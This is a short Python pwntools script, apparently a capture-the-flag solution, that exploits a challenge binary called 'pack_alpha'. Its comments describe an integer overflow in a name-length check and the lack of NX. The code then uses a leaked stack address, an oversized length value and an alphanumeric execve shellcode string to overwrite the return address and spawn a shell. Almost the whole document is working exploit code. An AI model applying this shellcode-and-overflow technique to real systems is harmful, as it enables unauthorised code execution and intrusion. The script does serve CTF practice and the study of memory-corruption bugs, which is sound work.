#!/usr/bin/env python3
#An Integer overflow lies in length of the name input which we can use it to make an overflow
#in the next input buffer..The intger overflow occurs bcoz it accepts input in long 
#But the check is done in 4 bytes int ..
#So if we pass a value greater than in the int range..
#We can overflow the next buffer
#Absence of NX allows us to make a shellcode ..
# We can't do rop here bcoz of the presence of PIE.
#The next part of the binary checks whether the binary range is in ASCII
#If it is not ..It simply exits the program..
#So we have to use alphanumeric shellcode to pass this check to get a shell

from pwn import *
context.clear(arch='amd64')
e = ELF("./pack_alpha_921a4674-b4ca-4899-b69f-90196260e9e4.pack_alpha")
r = process("./pack_alpha_921a4674-b4ca-4899-b69f-90196260e9e4.pack_alpha")
#r = remote("gc1.eng.run",30648)
r.sendlineafter(b"Email address:",b"ajay")
r.sendlineafter(b"Age:",b"22")
r.recvuntil(b"Your room number is: ")
stack_leak = int(r.recvline().strip(),16)
print(hex(stack_leak))
r.sendlineafter(b"Length of your name: ",b"2361183240335310979072")
a =shellcraft.linux.execve(b'/bin/sh\x00',0,0)
exploit = b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"  + b"A" * 49 + p64(stack_leak) 
r.send(exploit)
r.interactive()